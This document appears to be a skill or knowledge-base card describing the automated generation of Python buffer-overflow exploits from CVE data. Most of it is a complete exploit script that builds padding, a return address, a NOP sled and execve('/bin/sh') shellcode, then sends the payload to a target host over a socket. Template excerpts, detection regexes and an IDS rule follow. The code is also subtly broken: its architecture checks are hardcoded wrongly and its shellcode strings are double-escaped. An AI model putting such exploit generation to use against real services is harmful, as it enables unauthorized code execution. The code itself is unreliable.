# Buffer Overflow Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for buffer overflow vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: critical
- **Tags**: buffer-overflow, stack-overflow, heap-overflow, shellcode, rop, exploit-generation, cve, T1203, T1055

## Context and Use-Cases
- Generate working buffer overflow exploits from CVE descriptions
- Support x86 and x64 architectures
- Generate shellcode for target architecture
- Create cyclic patterns for offset discovery
- Useful for penetration testing and security research
- Demonstrate critical impact through arbitrary code execution

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information. Example: `{"cve_id": "CVE-2024-5566", "description": "Stack buffer overflow in network service"}`
- **target_info** (dict, required): Target configuration including `target_arch` (x86/x64). Example: `{"target_host": "192.168.1.100", "target_port": 9999, "target_arch": "x64"}`

## Procedure
1. Parse CVE description to identify buffer overflow type
2. Determine target architecture (x86 or x64)
3. Generate Python exploit class with socket communication
4. Implement `create_pattern()` for offset discovery
5. Implement `generate_shellcode()` for architecture-specific shellcode
6. Implement `create_exploit()` with padding, return address, NOP sled, and shellcode
7. Implement `send_exploit()` to deliver payload over network
8. Return complete exploit script

## Examples

### Generated Exploit Script
```python
#!/usr/bin/env python3
# Buffer Overflow Exploit for CVE-2024-5566
# Architecture: x64
# Vulnerability: Stack buffer overflow in network service

import struct
import socket
import sys

class BufferOverflowExploit:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = int(target_port)

    def create_pattern(self, length):
        """Create cyclic pattern for offset discovery"""
        pattern = ""
        for i in range(length):
            pattern += chr(65 + (i % 26))  # A-Z pattern
        return pattern

    def generate_shellcode(self):
        """Generate shellcode for x64"""
        if "x86" == "x86":
            # x86 execve("/bin/sh") shellcode
            shellcode = (
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            )
        else:
            # x64 execve("/bin/sh") shellcode
            shellcode = (
                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
            )
        
        return shellcode.encode('latin-1')

    def create_exploit(self, offset=140):
        """Create buffer overflow exploit"""
        print(f"[+] Creating buffer overflow exploit...")
        print(f"[+] Offset: {offset} bytes")
        
        # Pattern to reach return address
        padding = "A" * offset
        
        if "x64" == "x86":
            # x86 return address (example)
            ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
        else:
            # x64 return address (example)
            ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
        
        # NOP sled
        nop_sled = "\\x90" * 16
        
        # Shellcode
        shellcode = self.generate_shellcode()
        
        exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
        
        print(f"[+] Exploit size: {len(exploit)} bytes")
        return exploit

    def send_exploit(self, payload):
        """Send exploit to target"""
        try:
            print(f"[+] Connecting to {self.target_host}:{self.target_port}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.target_port))
            
            print("[+] Sending exploit...")
            sock.send(payload)
            
            # Try to interact
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {response}")
            except:
                pass
            
            sock.close()
            print("[+] Exploit sent successfully")
        
        except Exception as e:
            print(f"[-] Error: {e}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_host> <target_port>")
        print(f"Example: python3 {sys.argv[0]} 192.168.1.100 9999")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    
    exploit = BufferOverflowExploit(target_host, target_port)
    
    print(f"[+] Buffer Overflow Exploit for CVE-2024-5566")
    print(f"[+] Target: {target_host}:{target_port}")
    print(f"[+] Architecture: x64")
    
    # Create and send exploit
    payload = exploit.create_exploit()
    exploit.send_exploit(payload)

if __name__ == "__main__":
    main()
```

### Usage Example
```bash
python3 bof_exploit.py 192.168.1.100 9999

# Output:
# [+] Buffer Overflow Exploit for CVE-2024-5566
# [+] Target: 192.168.1.100:9999
# [+] Architecture: x64
# [+] Creating buffer overflow exploit...
# [+] Offset: 140 bytes
# [+] Exploit size: 180 bytes
# [+] Connecting to 192.168.1.100:9999
# [+] Sending exploit...
# [+] Exploit sent successfully
```

## Indicators / Detection

### Detection Patterns
```regex
# NOP sleds
\\x90{10,}

# Common shellcode patterns
\\x31\\xc0.*\\xcd\\x80  # x86 syscall
\\x48\\x31.*\\x0f\\x05  # x64 syscall
```

### Network IDS Rule
```
alert tcp any any -> any any (
  msg:"Buffer Overflow Shellcode Detected";
  content:"|90 90 90 90 90 90 90 90|";
  content:"|31 c0|";
  sid:1000002;
)
```


## Source Excerpts

### [S1] Buffer Overflow Detection
```python
# From exploit_template.py lines 351-353
# Buffer overflow
elif any(keyword in description_lower for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
    vuln_type = "buffer_overflow"
```

### [S2] Shellcode Generation
```python
# From exploit_template.py lines 1378-1393
def generate_shellcode(self):
    """Generate shellcode for {arch}"""
    if "{arch}" == "x86":
        # x86 execve("/bin/sh") shellcode
        shellcode = (
            "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
            "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
        )
    else:
        # x64 execve("/bin/sh") shellcode
        shellcode = (
            "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
            "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
        )
    
    return shellcode.encode('latin-1')
```

### [S3] Exploit Construction
```python
# From exploit_template.py lines 1395-1419
def create_exploit(self, offset=140):
    """Create buffer overflow exploit"""
    print(f"[+] Creating buffer overflow exploit...")
    print(f"[+] Offset: {{offset}} bytes")
    
    # Pattern to reach return address
    padding = "A" * offset
    
    if "{arch}" == "x86":
        # x86 return address (example)
        ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
    else:
        # x64 return address (example)
        ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
    
    # NOP sled
    nop_sled = "\\x90" * 16
    
    # Shellcode
    shellcode = self.generate_shellcode()
    
    exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
    
    print(f"[+] Exploit size: {{len(exploit)}} bytes")
    return exploit
```

